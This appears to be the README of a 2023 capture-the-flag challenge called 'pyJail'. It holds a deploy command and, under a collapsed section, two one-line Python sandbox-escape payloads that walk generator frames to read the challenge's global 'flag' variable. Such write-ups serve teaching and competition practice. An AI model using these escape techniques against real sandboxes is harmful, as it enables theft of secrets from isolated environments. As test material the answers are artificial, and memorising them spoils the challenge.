## pyJail

### Description
Make your flag generator!

### Deploy
Provide [jail.py](https://github.sec.samsung.net/SCTF/chals2023/blob/main/pyjail/jail.py)

```
docker-compose up --build -d
```

#### Exploit
<details>
<summary>show exploit</summary>

```
{}[[*[x.append(x[0].gi_frame.f_back.f_back.f_globals['flag']for _ in[1])or x[0]for x in[[]]][0]][0]]
  
shorter one!
[*[x.append({}[x[0].gi_frame.f_back.f_back.f_globals['flag']]for _ in[1])or x[0]for x in[[]]][0]]
```

</details>
